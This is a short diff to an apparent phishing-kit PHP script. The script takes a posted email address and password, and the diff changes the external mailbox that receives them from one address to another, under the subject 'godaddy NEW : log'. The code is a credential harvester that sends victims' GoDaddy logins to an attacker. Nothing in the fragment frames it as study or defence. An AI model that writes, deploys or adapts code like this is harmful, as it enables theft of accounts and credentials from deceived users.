@@ -5,7 +5,7 @@ if(!empty($_POST)) {
  $email= $_POST['email'];
  $password = $_POST['password'];
  
-		$to = "makemeyours22@yandex.com";
+		$to = "export@420blaze.it";
 		
 		
          $subject = "godaddy NEW : log";
